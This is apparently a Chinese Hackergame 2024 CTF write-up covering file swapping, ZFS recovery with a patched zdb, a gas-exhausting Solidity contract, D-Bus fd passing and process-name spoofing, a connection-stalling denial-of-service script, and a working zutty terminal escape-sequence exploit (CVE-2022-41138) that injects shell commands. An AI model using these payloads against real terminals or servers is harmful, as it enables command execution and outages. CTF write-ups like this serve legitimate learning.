2. 使用一个与交换对象同大小的稀疏文件作为接收对象，这样交换过程中只占用写入过的内存，结合前一点，可实现交换过程完全零内存开销。并且，交换完后自然是一个同大小的完整文件，可以避免文件合并和切分操作

执行起来就是：
1. Alice 和 Bob 从各自的文件尾部发出数据，对方新开一个与目标大小同等的临时文件接收数据（Alice 开一个 64MB 的，Bob 开一个 128MB 的），每发完一段数据就执行 `ftruncate()` 将其从自己这里删掉。期间注意文件写入位置的设置。
2. 当 Alice 收到 64MB（也就是 Bob 发完了后一个文件）后，新开一个 64MB 稀疏文件来接收，发送逻辑不变、从原 128MB 文件读取；Bob 同时切换为读取前一个文件来发送，但收到的数据仍继续写入当前 128MB 的文件，继续交换，期间保持执行 `ftruncate()`

代码如下，本来想优雅一点，把错误处理都做好，结果最后还是 能 跑 就 行。本地调试功能 OK 以后上传到平台，一次跑通。
```c
#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>

#define SZ_LARGE_M 128
#define SZ_LARGE_S 64

// Alice 的程序
int main(int argc, char *argv[]) {
    FILE *fp = fopen("./space/file", "r+");  // Alice 发送文件
    FILE *fp1 = fopen("./space/file1", "w"); // 接收文件
    FILE *fp2 = fopen("./space/file2", "w"); // 接收文件
    FILE *cfp = fp2; // 当前正接收的文件

    if (fp == NULL) { // 很多地方没做错误判断，反正能跑就行，又不是业务代码
        perror("open failed");
        return -1;
    }

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket create failed");
        fclose(fp);
        return -1;
    }

    struct sockaddr_in inaddr = { // 使用 127.0.0.1:<任意端口> TCP socket
        .sin_family = AF_INET,
        .sin_port = 0x1616,
        .sin_addr.s_addr = 0
    };

    struct linger ling; // 这段是用来在本地测试时避免 TIME_WAIT 状态占住端口用的
    ling.l_linger = 0;
    ling.l_onoff = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));

    if (bind(sockfd, &inaddr, sizeof(inaddr)) < 0) { // Alice 做服务端
        perror("bind error");
        fclose(fp);
        close(sockfd);
        return -1;
    }

    if (listen(sockfd, 1000) < 0) {
        perror("listen error");
        fclose(fp);
        close(sockfd);
        return -1;
    }
    printf("Listen OK\n");

    int sz;
    int clientfd = accept(sockfd, &inaddr, &sz);
    if (clientfd <= 0) {
        perror("accept error");
        fclose(fp);
        close(sockfd);
        return -1;
    }

    int rcvd = 0;
    int sent = 0;
    int max = 1024 * 1024 * SZ_LARGE_M;

    printf("Accept OK\n");

    /* server send first */
    char buf[4096];
    fseek(fp, 0, SEEK_END);                       // 读取指针定位到尾部减一个 buffer 长度
    fseek(fp, -4096, SEEK_CUR);

    ftruncate(fileno(cfp), SZ_LARGE_S*1024*1024); // 让文件像头发一样稀疏
    fseek(cfp, 0, SEEK_END);                      // 写入指针定位到尾部减一个 buffer 长度
    fseek(cfp, -4096, SEEK_CUR);
    while (1) {
        int this = fread(buf, 1, 4096, fp);       // 发送本方数据
        if (this <= 0) {
            printf("EOF %d", sent);
            fclose(fp);
            close(clientfd);
            close(sockfd);
            return 0;
        }

        int this_sent = 0;
        while (this_sent < this)
        {
            int r = send(clientfd, (char *)buf + this_sent, this - this_sent, 0);
            if (r <= 0)
            {
                perror("send error");
                fclose(fp);
                close(clientfd);
                close(sockfd);
                return -1;
            }
            this_sent += r;
        }

        fseek(fp, -this * 2, SEEK_CUR);           // 读取指针定位到前一个 buffer，注意 read 操作推动了指针
        ftruncate(fileno(fp), ftell(fp) + 4096);  // 删除已读 buffer

        int this_rcvd = 0;
        while (this_rcvd < this) {                // 接受对方数据
            int r = recv(clientfd, (char *)buf + this_rcvd, this - this_rcvd, 0);
            if (r <= 0)
            {
                perror("recv error");
                fclose(fp);
                close(clientfd);
                close(sockfd);
                return -1;
            }
            this_rcvd += r;
        }
        if (fwrite(buf, 1, this, cfp) < this) {   // 写入对方数据
            perror("write error");
            fclose(fp);
            close(clientfd);
            close(sockfd);
            return -1;
        }
        printf("%d\n", ftell(cfp));
        if (ftell(cfp) == 4096) {
            if (cfp == fp2)                       // 写完一个文件，更换下一文件
            {
                printf("Switching file\n");
                cfp = fp1;
                ftruncate(fileno(cfp), SZ_LARGE_S * 1024 * 1024);
                fseek(cfp, 0, SEEK_END);          // 定位写入指针到尾部减一个 buffer
                fseek(cfp, -4096, SEEK_CUR);
            }
            else
            {
                printf("OK\n");
                break;
            }
        } else {
            fseek(cfp, -this * 2, SEEK_CUR);      // 本文件还没交换完，定位写入指针到上一个 buffer
        }

        //printf("Swapped %d\n", this);
    }

    fclose(fp);
    close(clientfd);
    close(sockfd);
    printf("Swapped OK\n");
    return 0;
}
```

```c
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <unistd.h>

#define SZ_LARGE_M 128
#define SZ_LARGE_S 64

// Bob 的程序
int main(int argc, char *argv[]) {
    FILE *wfp = fopen("./space/file", "w");   // 待写入的对方文件
    FILE *fp1 = fopen("./space/file1", "r+"); // 读取本方文件
    FILE *fp2 = fopen("./space/file2", "r+");
    FILE *fp = fp2;
    //FILE *fp = fopen(argv[1], "r+");
    if (fp == NULL) {
        perror("open failed");
        return -1;
    }

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket create failed");
        fclose(fp);
        return -1;
    }

    struct sockaddr_in inaddr = {
        .sin_family = AF_INET,
        .sin_port = 0x1616,
        .sin_addr.s_addr = 0x0100007f // 127.0.0.1
    };

    sleep(3); // 等待 Alice 完成启动

    if (connect(sockfd, &inaddr, sizeof(inaddr)) < 0) {
        perror("connect error");
        fclose(fp);
        close(sockfd);
        return -1;
    }

    int rcvd = 0;
    int sent = 0;
    int max = 1024 * 1024 * SZ_LARGE_M;

    /* server send first */
    char rbuf[4096];
    char wbuf[4096];
    fseek(fp, 0, SEEK_END);
    fseek(fp, -4096, SEEK_CUR);                       // 读取指针定位到文件尾减一个 buffer

    ftruncate(fileno(wfp), SZ_LARGE_M*1024*1024);
    fseek(wfp, 0, SEEK_END);
    fseek(wfp, -4096, SEEK_CUR);                      // 写入指针定位到文件尾减一个 buffer

    while (1) {
        int this = fread(rbuf, 1, 4096, fp);

        int this_rcvd = 0;
        while (this_rcvd < this) {
            int r = recv(sockfd, (char *)wbuf + this_rcvd, this - this_rcvd, 0);
            if (r <= 0)
            {
                perror("recv error");
                fclose(fp);
                close(sockfd);
                return -1;
            }
            this_rcvd += r;
        }

        if (fwrite(wbuf, 1, this, wfp) < this) {
            perror("write error");
            fclose(fp);
            close(sockfd);
            return -1;
        }
        fseek(wfp, -8192, SEEK_CUR);                  // 写入指针调整到前一个 buffer，注意 fwrite 推动了指针

        int this_sent = 0;
        while (this_sent < this)
        {
            int r = send(sockfd, (char *)rbuf + this_sent, this - this_sent, 0);
            if (r <= 0)
            {
                perror("send error");
                fclose(fp);
                close(sockfd);
                return -1;
            }
            this_sent += r;
        }

        if (ftell(fp) == 4096)                       // 读完当前文件，切换至前一文件继续读
        {
            if (fp == fp2)
            {
                printf("EOF file 2\n");
                fp = fp1;
                fseek(fp, 0, SEEK_END);              // 初始设置读位置为尾部减一个 buffer
                fseek(fp, -4096, SEEK_CUR);
            }
            else
            {
                printf("EOF file 1\n");
                break;
            }
        }
        else
        {
            fseek(fp, -this * 2, SEEK_CUR);          // 当前文件没读完，设置读位置为前一个 buffer
            ftruncate(fileno(fp), ftell(fp) + 4096); // 删除已读部分
        }

        max -= this;

        //printf("Swapped %d\n", this);
    }

    fclose(fp);
    close(sockfd);
    printf("Swapped OK\n");
    return 0;
}
```
## ZFS 文件恢复
### Text File
#### 最终操作
1. 尝试 `strings` 无用，`binwalk` 无用，ZFS snapshot 里面没有。继续搜索 ZFS 文件恢复，得知一般可以用 `zdb`
3. 使用如下命令查看 ZFS 中还有哪些 object，可以看到有两个 ZFS plain file 但是都 on delete queue，没有路径，无法用 `zdb -r` 读取
```sh
sudo losetup -fP ./zfs.img
sudo zdb -e hg2024/data@mysnap # 先试了 hg2024/data 发现里面没有文件的痕迹，再试试 mysnap 果然有了
sudo zdb -e hg2024/data@mysnap 2 # 2 是其中一个 ZFS plain file 的 object number
sudo zdb -e hg2024/data@mysnap 3 # 另一个 ZFS plain file
```
3. git clone 一份 openzfs/zfs 的源码，修改 `zdb -r` 的逻辑，使其接受一个 object number 而非路径
```diff
diff --git a/cmd/zdb/zdb.c b/cmd/zdb/zdb.c
index 465876712..6666a5296 100644
--- a/cmd/zdb/zdb.c
+++ b/cmd/zdb/zdb.c
@@ -9617,9 +9617,7 @@ main(int argc, char **argv)
                if (argc != 3)
                        usage();
                dump_opt['v'] = verbose;
-               error = dump_path(argv[0], argv[1], &object);
-               if (error != 0)
-                       fatal("internal error: %s", strerror(error));
+               object = atoi(argv[1]);
        }
 
        /*
```
4. 执行 `make` 重新编译 zdb，然后 `sudo ./zdb -er hg2024/data@mysnap 2 1.txt` ，得到的 `1.txt` 末尾即为 flag1
#### 解题思路
这一问其实是晚于第二问做出来的。因为第二问的脚本未被压缩和截断，直接能从 raw image 和 `zdb -R` 里看到，其所需的文件时间也可以直接用 `zdb <dataset> <object number>` 获取。除了时区转换顿了一下，第二问都是很顺利的。

第一问就是真的抓狂，大概是这么个解题历程：
1. `binwalk` 找到了一段 zlib 压缩数据，能解，但解出来全是字母，不知道跟 flag 有啥关系（最后发现这段字母的最后两个字母 fl 是 flag 的一部分）
2. 学习了大量 ZFS 文档，~~发现 BSD 社区也存在跟 LinuxQuestions 类似的情况~~
3. 尝试从 snapshot 恢复，当然没有（ZFS 跟标准 Linux 文件系统用起来真不一样啊）。继续搜索，知道了 `zdb`.
4. `zdb` 看到第一个 object 有三个 block，长度有 4K+ 字节。怎么会有那么长的 flag 呢？平台的 flag 输入框都粘不下。但是第二问都解出来了，说明这个 object 肯定是 flag1，迷惑。
5. `zdb` 看到的三个 block 里，有两个有 DVA（类似于磁盘上的地址），但是用 `zdb -R <D>:<V>:<A>:d` 只能解出 zlib 那段（`:d` 会尝试解压缩 block，这还是从代码里看的，文档没说），跟 `binwalk` 发现的一样。另一段 lz4 的解出来没有可读内容，关了容易引起混淆的 RLE 算法也不行。我怀疑是 `zdb -R <D>:<V>:<A>:d` 只能盲试解压算法，无法利用“object metadata”中的信息去解压，虽然看到它猜中了 lz4，但数据还是不对。
6. 到此为止，还剩最后那个没有 DVA 的 EMBEDDED 数据块没有读过，但我也不知道它的 DVA 是什么。采用 rootbp 后面的 DVA 去读，也没有任何可读内容。
7. 没有任何办法了，只能想办法复用 `zdb -r` 的完整读取逻辑了。读了下它的源码，发现它只是要一个 object number 而不是真的要用路径做什么，于是魔改代码，跳过路径解析，直接喂进去 object number，终于能读出来。

我到现在都不知道这东西有没有可能通过 `zdb -R` 直接读出来……
### Shell Script
#### 最终操作 | 解题思路
如上所述，摸到了 zdb 以后，这问秒杀。

```sh
strings zfs.img # 找到唯一的一个 shell 文件，得知需要文件修改、创建时间等
sudo zdb -e hg2024/data@mysnap 2
sudo zdb -e hg2024/data@mysnap 3 # 查看两个文件的 mtime、ctime 等
date -d 'Mon Nov 10 04:49:03 2036 GMT+8' +%s # 将这些日期转化为 Unix timestamp 去计算，仅举一例。注意不要多此一举写一个 GMT+0
# 然后把日期拿去脚本里面验证 OK 就可以了
```

~~你是一个一个一个 object 啊啊啊啊啊啊~~

另外，zdb 一定得 `-vvvvvvvvvvvvvvvvvvvvv` 着用吗？
## 链上转账助手
### 转账失败
#### 最终操作 | 解题思路
其实是没有什么思路的，只是将题目环境编译出来的 JSON 复制出来，找到其中字节码原样复制上去，居然就通过了？？？

> 现在认为是因为 transfer 操作在对方地址是合约（地址有字节码）的时候，必须有 `receive()` 或 `fallback()` 函数定义才可以成功。而我复制上去的 challenge01.sol 里面并没有这两个函数，因此无法接受转账，transfer 就失败了。

### 转账又失败
注意：仅为个人 + ChatGPT 的理解，可能不准确！
#### 最终操作
1. 注意到 `call()` 操作能够捕获它后继函数的所有异常。也就是说，只要自己的合约触发错误或回滚，那么势必无法达成让调用方出错的目的。
2. 基于前述问题，唯一方案就是让自己的函数正常执行完，然后留下一些“影响”让调用方出错。而调用方只是一些加法、数组操作，如果要让它们出错，那只有两种可能性：要么是 gas 用完了，要么是数值操作溢出。数值溢出看起来做不到，那就只能耗 gas.
3. 但是，不管我在函数里怎么堆循环，好像执行结果都没有多耗多少 gas，Remix IDE 的 debugger 显示函数里我的函数里莫名其妙地触发了 revert，也不知道错误在哪。于是选择了最笨的办法：开一堆持久存储空间，然后拼命往里写，再搭配 event 精确调整 gas 消耗，使得自己的函数可以执行完，但返回之后到下一次执行前会 out of gas. 由于程序已经被后一问覆盖了（但没做出来），所以以下仅供参考，800 不一定是准确的数字：
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BatchTransfer1 {
    uint256 public myBalance;
    uint256 public myBalance1;
    uint256 public myBalance2;
    uint256 public myBalance3;
    uint256 public myBalance4;
    uint256 public myBalance5;
    uint256 public myBalance6;
    uint256 public myBalance7;
    uint256 public myBalance8;
    uint256 public myBalance9;
    uint256 public myBalance10;
    uint256 public myBalance11;
    uint256 public myBalance12;
    uint256 public myBalance13;
    event Transfer(uint256 _value);

    fallback() external payable {
        myBalance = msg.value;
        myBalance1 = msg.value;
        myBalance2 = msg.value;
        myBalance3 = msg.value;
        myBalance4 = msg.value;
        myBalance5 = msg.value;
        myBalance6 = msg.value;
        myBalance7 = msg.value;
        myBalance8 = msg.value;
        myBalance9 = msg.value;
        myBalance10 = msg.value;

        for (uint256 i = 0 ; i < 800; i++) {
            emit Transfer(myBalance10);
        }
    }

    receive() external payable {
        myBalance = msg.value;
        myBalance1 = msg.value;
        myBalance2 = msg.value;
        myBalance3 = msg.value;
        myBalance4 = msg.value;
        myBalance5 = msg.value;
        myBalance6 = msg.value;
        myBalance7 = msg.value;
        myBalance8 = msg.value;
        myBalance9 = msg.value;
        myBalance10 = msg.value;

        
        for (uint256 i = 0 ; i < 800; i++) {
            emit Transfer(myBalance10);
        }
     }
}
```
（理论上说，`fallback()` 和 `receive()` 写一个就可以，但是做到这里的时候距离 Hackergame 结束只剩下一个小时了，懒得改了）
#### 解题思路
这是我第一次做 Hackergame 里面的区块链题目（~~主要是因为我距离 general 并列榜一只差这一道题了~~），开始的时候真的是完全没有思路，自己研究了半天没结果，给 anvil 加了各种调试的命令行参数、给自己的合约写 event 做追踪，到处乱撞，一无所获，完全不知道自己的函数里面发生了什么，甚至连题目合约中 `require` 后面的错误信息都看不到。搜索到了 Remix IDE，也是因为误以为要把 Python 的执行脚本用 JS 重写一遍很麻烦，而没有第一时间去用，很焦虑。

仔细研究了下 Remix IDE，发现它可以在图形界面直接部署合约，并调用合约里的函数，并且还有个 debugger 可以看到合约的每一步执行历程（虽然在 `call()` 前后好像不是很准），完全不需要写 JS. 这极大地促进了我对交易过程的理解，再加上复习了去年的题解，最终操作中的“注意到”就是从这里来的。

而具体消耗 gas 的方法，则是问 ChatGPT 问出来的。等能够从 IDE 中看到每次修改代码以后，gas 在逐步上升，就证明已经在成功的路上了。

中间有一个小插曲：最开始是全靠链上持久存储来堆 gas 的，但是还没堆到 gas 耗尽，程序码的大小就先超过了 stdin line buffer 的上限被截断了，无法完全输入给平台，不得不转向其他方式消耗 gas.

（至于我为什么抗拒写循环：到现在都不知道我最开始写的几个 for loop 为什么会被 revert，对 Solidity 里面的循环有一些小小的阴影。认了这个韭菜的命😅）
## 不太分布式的软总线
### What DBus Gonna Do?
#### 最终操作 | 解题思路
1. 阅读 flagserver.c，发现 GetFlag1 service 只需要传入一个特定字符串作为参数就可以调用成功
2. 本地启动题目容器来做测试：在输入 base64 时不输入任何东西使其卡住，然后用另一个终端 `docker exec -it <container> sh` 进去，执行 `dbus-send` 查看其帮助，以确定带参数请求的写法。反复拼参数就可以拼出来（注意从 server.py 找到 dbus socket 的正确位置）：
```sh
dbus-send --bus=unix:path=/dev/shm/system_bus_socket --print-reply --dest=cn.edu.ustc.lug.hack.FlagService /cn/edu/ustc/lug/hack/FlagService cn.edu.ustc.lug.hack.FlagService.GetFlag1 string:"Please give me flag1"
```
3. 在容器内测试 OK 以后，加上一个 `#!/bin/sh` 的头部提交到平台即可拿到 flag 1.

之前搞过一个 wpa-supplicant 开热点以后 AP 接口不会自动加入指定网桥的问题，那时用过 dbus-send，所以这题算是有点基础。特别是看到 Docker image 里专门安装了 dbus-send，感觉一定有一问是同样简单的。实际果然如此。
### If I Could Be A File Descriptor
#### 最终操作 | 解题思路
1. 阅读 flagserver.c，发现 GetFlag2 service 需要传入一个非实体文件且内容为特定字符串的 fd
2. fd 怎么选是很简单的，比如 `pipe()` `socketpair()` 都可以创建很容易操作的非文件 fd. 这里选 `pipe()`，设计思路是自己向写端写入指定字符串，然后将读端发送到 flagserver
3. 至于 dbus 怎么发 fd，纯纯是 API search 没有设计成分。直接交给 ChatGPT 写一个带 fd call service 的 demo，然后自己加入 `pipe()` 并调试至可以运行（见下方描述的问题）：
```c
#include <gio/gio.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <stdlib.h>
#include <unistd.h>    // For socket functions
#include <sys/socket.h> // For socket functions

#define DBUS_NAME       "cn.edu.ustc.lug.hack.FlagService"
#define OBJECT_PATH     "/cn/edu/ustc/lug/hack/FlagService"
#define INTERFACE_NAME  "cn.edu.ustc.lug.hack.FlagService"
#define METHOD_NAME     "GetFlag2"

int main() {
    GError *error = NULL;
    int pfd[2];

    // Step 1: Create a pipe (for demonstration)
    int ret = pipe(pfd); // 0 is read, 1 is write
    if (ret == -1) {
        perror("Failed to create socket");
        return EXIT_FAILURE;
    }

    const char s[] = "Please give me flag2\n";
    write(pfd[1], s, sizeof(s));
    close(pfd[1]);
    printf("EXE\n");

    setenv("DBUS_SYSTEM_BUS_ADDRESS", "unix:path=/dev/shm/system_bus_socket", 1);

    // Step 2: Set up GDBus connection to the session bus
    GDBusConnection *connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (!connection) {
        fprintf(stderr, "Failed to connect to D-Bus: %s\n", error->message);
        g_error_free(error);
        return EXIT_FAILURE;
    }

    // Step 3: Create a GDBusProxy for the remote interface
    GDBusProxy *proxy = g_dbus_proxy_new_sync(
        connection,
        G_DBUS_PROXY_FLAGS_NONE,
        NULL,                   // No custom interface info
        DBUS_NAME,              // D-Bus name
        OBJECT_PATH,            // Object path
        INTERFACE_NAME,         // Interface name
        NULL,                   // Cancellable
        &error
    );

    if (!proxy) {
        fprintf(stderr, "Failed to create proxy: %s\n", error->message);
        g_error_free(error);
        g_object_unref(connection);
        return EXIT_FAILURE;
    }

    // Step 4: Create GUnixFDList with the pipe file descriptor
    GUnixFDList *fd_list = g_unix_fd_list_new();
    int fd_index = g_unix_fd_list_append(fd_list, pfd[0], &error);
    if (fd_index == -1) {
        fprintf(stderr, "Failed to add socket to FD list: %s\n", error->message);
        g_error_free(error);
        g_object_unref(proxy);
        g_object_unref(connection);
        return EXIT_FAILURE;
    }

    // Step 5: Prepare arguments for the D-Bus method (just the FD index in this case)
    GVariant *params = g_variant_new("(h)", fd_index); // "h" is the type for a file descriptor in GVariant

    // Step 6: Call the D-Bus method with the file descriptor
    GUnixFDList *out_fd_list;
    GVariant *result = g_dbus_proxy_call_with_unix_fd_list_sync(
        proxy,
        METHOD_NAME,
        NULL,
        G_DBUS_CALL_FLAGS_NONE,
        -1,            // Default timeout
        fd_list,
        &out_fd_list,
        NULL,          // Cancellable
        &error
    );

    if (!result) {
        fprintf(stderr, "Failed to call method: %s\n", error->message);
        g_error_free(error);
    } else {
        printf("Method call successful!\n");
                gchar *response_value;
        
        g_variant_get(result, "(&s)", &response_value); // Use the correct format here

        printf("Method call successful! Received response: %s\n", response_value);

        g_variant_unref(result);
    }

    // Cleanup
    g_object_unref(fd_list);
    g_object_unref(proxy);
    g_object_unref(connection);

    return EXIT_SUCCESS;
}
```
4. 提交，拿到 flag 2

这里有一点问题：如果要连接到非标位置的 dbus socket，名义上应该用 `g_dbus_connection_new_for_address(path)`. 但是实际用这个函数建立连接的话，后续代码会报错，要求必须要 register 到 dbus 上才允许使用。而 dbus-send 似乎也没这么做就能 call，并且要 register 得成为一个类似 flagserver 的程序也很麻烦（存疑，但肯定得有更多的操作），看起来不像是正确的方向。

注意到 server.py 设置了名为 `DBUS_SYSTEM_BUS_ADDRESS` 的环境变量，且 flagserver.c 没有任何类似于 `g_dbus_connection_new_for_address()` 的 connection 代码。于是推测设置它的话，直接用 `g_bus_get_sync(G_BUS_TYPE_SYSTEM)` 就可以得到一个常规的、不需要自己 register 的 connection. 试了一下，果然如此。其中原理倒是还没探索过。除此之外是一遍直接跑通的。
### Comm Say Maybe
#### 最终操作 | 解题思路
1. 阅读 flagserver.c，发现 GetFlag3 service 需要 caller comm 为 getflag3，不需要传入参数
2. 一眼 `prctl`，在第二问的代码上 call 之前的任意位置加入：
```c
prctl(PR_SET_NAME, "getflag3");
```
3. 提交，拿到 flag 3

我还好奇题目附件里的 getflag3.c 是做啥的呢…… 看官方题解，这里还有很多别的操作，并且也可以上强度，是时候学习一些新思路了。
## 动画分享
### 只要不停下 HTTP 服务，响应就会不断延伸
#### 最终操作
1. 题目代码交给 ChatGPT，问这段代码可能有什么安全缺陷。其中提到了“处理连接是无限期的，并且一次只处理一条连接，攻击者发送大量连接可能导致 DoS”
2. 编写一个脚本，开启 TCP 连接后不发任何数据，让 server 卡在 `recv()` 处，然后 health check 就会因为超时而失败，从而拿到 flag. 在编写的时候要注意让当前进程脱离 `subprocess.run()` 的管控，否则超时被杀也就没有效果了。这是来自去年 Hackergame 的经验。另外，脚本结尾要多花点时间等待自己的程序启动，否则 server 还没卡住就开始 health check，起不到效果。

脚本：

```sh
#!/bin/bash

unset http_proxy # 本地测试环境有这个设置，将其去除以便本地测试

exec 0<&- # 关闭三个文件描述符，否则即便 setsid 也无法脱离 subprocess.run
exec 1<&-
exec 2<&-

# 设为新的 session leader，以便脱离 subprocess.run
setsid -f python3 -c "$(echo -ne 'import socket; import time; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0); s.connect(("127.0.0.1", 8000)); \ns.recv(1024)\nwhile True:\n    time.sleep(1)\ns.recv(1024)')" &
disown # setsid 后这个应该可以不要的，但能跑就行
sleep 2 # 保证 server 被上面的 python 卡住以后才回到判题脚本中执行 health check
```
#### 解决思路
一开始受到题目描述误导，光想着怎么让它崩溃了。注意到程序已经有了非常充分的错误检查，那么能够引发崩溃的地方应该只能是没有做 catch 的地方。但是，没 catch 的地方死活找不出来问题。

然后才想到让 server 卡死可能也是个方法，比如：
 * 让容器的 fd 耗尽使得 accept 新连接失败（好像这个也能 catch 到？）
 * 耗尽内存使得一些内存申请失败（微操不来）
 * 在后台开启大量线程尝试连接使得 health check 的连接一直被挤在 socket backlog 之外而被丢弃（线上环境试了没用，本地环境没限制 PID 数目才有用）
 * 输出大量花里胡哨的 URL，使得终端模拟器刷新变慢，卡住 stdout（试了没用）

没有思路了，想着去问 ChatGPT，结果一发入魂，还是这么简单的地方。~~亏我本职工作还是 IT，我紫菜~~

另外，搭建本地测试环境时，搞清程序结构、意识到 Rust 程序要手动编译和复制花了几分钟，找到 Rust 程序是怎么编译的又花了几分钟，然后发现我电脑上居然有已经配置好的 Rust 工具链😅我都忘了上次编译 Rust 程序是什么时候了。

### 希望的终端模拟器，连接着我们的羁绊
#### 最终操作
1. 提示非常明显，跟终端模拟器有关。去找到题目中使用的 zutty 0.12 的代码，分析从 0.12 开始到现在的[所有提交](https://git.hq.sig7.se/zutty.git/shortlog)，很容易找到 [Do not echo invalid input on DECRQSS (Request Status String)](https://git.hq.sig7.se/zutty.git/commit/bde7458c60a7bafe08bbeaafbf861eb865edfa38) 这个提交，里面提及了 invoke an arbitrary command 和 CVE-2008-2383，这很可能就是我们要找的东西
2. 搜索 CVE-2008-2383，没找到啥 PoC（其实 Debian bug 就有，太急了没看到），但是搜索“CVE-2008-2383 zutty”发现 zutty 的这个问题被分配了一个新的 CVE：[CVE-2022-41138](https://bugs.gentoo.org/868495). 这里面也有一个 PoC text file
3. 因为是 echo back input，所以容易想到要做的事情是先把要做的指令打出来，然后按 Ctrl-C 中止 server，再按下回车执行刚才的指令。而指令可以用 `cp /flag2 /dev/shm/executable` 然后在自己的脚本中 cat 出来即可，覆盖 /dev/shm/executable 的方式是为了保证自己的脚本能够读取此路径
4. 因为 Ctrl-C 有时候会打印出 `^C`，所以我猜它是一个 ASCII 控制字符，类似于 `\n`. 用这个类比去问 ChatGPT，它说是 `\x03` （End of Text）
5. 因为 server 会从 `\n` 切断输出，因此需要找一个其他的能让 shell 视作回车的东西，同时能被 server 输出来。继续问 ChatGPT，发现是 `\r` （好有道理，我怎么没想到呢……）
6. 以上思路中所有的做法都可以实现了，那么接下来就是急急急环节，反复调试 PoC 使其达成预期效果。最终脚本如下：
```python
#!/usr/bin/python3

import socket
import time
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
s.connect(("127.0.0.1", 8000))

buf2 = bytearray([
	0x1B, 0x50, 0x24, 0x71, 0x0D, 0x03, 0x0d, 0x63, 0x70, 0x20, 0x2F, 0x66, 0x6C,
	0x61, 0x67, 0x32, 0x20, 0x2F, 0x66, 0x6C, 0x61, 0x67, 0x31, ]) + bytearray(b"; cp /flag2 /tmp/flag2; cp /flag2 /dev/shm/executable") + bytearray([0x0D,  0x0d, 0x1B,
	0x5C, 0x0d
])
# 以下可能不准确：
# 0x1B, 0x50, 0x24, 0x71 DECRQSS 指令开头
# 0x0D 回车，习惯性操作
# 0x03 Ctrl-C，退出 server
# 0x0d 回车，习惯性操作
# 后面是这条指令：
# cp /flag2 /flag1; cp /flag2 /tmp/flag2; cp /flag2 /dev/shm/executable
# 0x0D, 0x0d 回车，习惯性操作
# 0x1B, 0x5C, 0x0d DECRQSS 指令结尾

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
s.connect(("127.0.0.1", 8000))
s.send(b"GET /" + buf2 + b" HTTP/1.1\r\n\r\n")
print(s.recv(1024))
s.close()

time.sleep(8)
os.system("cat /dev/shm/executable") # 此时自己已被替换为 flag2
```
#### 解题思路
因为社畜没时间解题，很急，所以 PoC 里面到底哪部分是要执行的指令、哪部分是 DECRQSS 本身 压根没看，直接把可见文本部分全改成 `cp /flag2 /flag1` 试图通过 flag1 的逻辑拿到结果。然后喜闻乐见地失败了：

```
00000000  1B 50 24 71 03 0D 63 70 20 2F 66 6C 61 67 32 20  .P$q..cp /flag2 
00000010  2F 66 6C 61 67 31 0D 1B 5C 0D                    /flag1..\.
```
这是因为判题脚本是先把 flag1 读到内存里，再运行程序，所以程序替换的 flag1 就算执行了也不会读到。这一度让我以为 payload 构造失败了，于是丧心病狂地尝试了很多构造，最终才发现这个问题。所以，上面脚本中的指令之所以有 `cp /flag2 /flag1; cp /flag2 /tmp/flag2; cp /flag2 /dev/shm/executable` 这么长，都是因为这里测试测的，有那么多莫名其妙的 `\r` 也是这个原因😂

测试期间，还搞乱过 DECRQSS 本身的序列，以及有时候忘记 `\n` 会被截断，所以调试时间超乎寻常。我甚至还起了 strace 去追踪这个终端里的 bash 到底执行了什么，结果也没起到太大的帮助。最后这个 payload 完全是运气好终于凑对了😂

做题真不能急吧，不然差点到手的 flag 要飞了……
## 关灯

前三小问都是一个思路，一起说了。
#### 最终操作 | 解题思路
1. 去搜索学习了一下关灯游戏的数学模型，看到一句话“最终状态只与每个按键按了多少次有关，与按键顺序无关，每个按键按奇数次与按 1 次结果是一样的”，于是想到结果应该就是“初态 XOR 所有按键的影响”这样算的。也就是说，每个按键按下后会产生的效果是一个矩阵，会影响到的灯为 1，不影响的灯为 0. 按下以后灯的状态就是初态 异或 这个矩阵，把所有按了的键的效果矩阵都异或一次，就得到了结果。
2. 现在要基于这个猜想，建立一个可计算的模型。“效果矩阵”就直接用题目代码 `convert_switch_array_to_lights_array()` 一次传入一个灯来生成即可。为了简单起见，把效果矩阵和灯的最终状态都拉平为一维，这样就可以得到一个很像线性方程组的矩阵形式的等式：“所有按键的效果矩阵 异或 按键的操作序列 得到 题目输出”。本地运行题目代码，打印 switch array 和 light array，然后代入这个等式，验证发现是 OK 的，以后将会基于这个方程去思考。
3. 现在的问题是，效果矩阵和题目输出已知，如何解出操作序列。在之前的搜索中，看到有人提到异或操作可以理解为模 2 加法，普通线性方程组用 `numpy.linalg.solve()` 解，于是搜索 `linalg solve modulo 2`，结果中大量提到“linear equation”。另外 ChatGPT 直接把“模 2”说成了 `GF(2)`，这下就有很多关键词了
4. 搜索 `linear equation modulo 2` 和 `linear equation gf 2`，辗转找到了[这个脚本](https://github.com/nneonneo/pwn-stuff/blob/main/math/gf2.py)。将效果矩阵和结果输入，它确实能给出结果，靠这个过了前两问。以下是修改这个脚本的 diff：
```diff
--- solve-org.py 2024-11-15 23:59:26.141521765 +0800
+++ solve.py     2024-11-08 16:43:57.367774228 +0800
@@ -4,6 +4,9 @@
 def num2vec(x, w):
     return [int(c == '1') for c in '{:0{w}b}'.format(x, w=w)]
 
+def str2vec(w):
+    return [int(c == '1') for c in w]
+
 def vec2num(x):
     return sum(xi << i for i, xi in enumerate(reversed(x)))
 
@@ -93,20 +96,174 @@
         input.append(v)
         crcs.append(crc32(v))
 
-    A = transpose([num2vec(c, 32) for c in crcs])
-    b = num2vec(target, 32)
-
-    for x in solve_gf2(A, b):
-        if sum(x) % 2 == 1:
-            # crc32 starts with the constant 0xffffffff, so only odd-parity solutions will be valid
-            break
-    else:
-        raise Exception("no solution!")
-
-    out = b'\0' * len(input[0])
-    for i, v in enumerate(x):
-        if v:
-            out = xorstr(out, input[i])
-
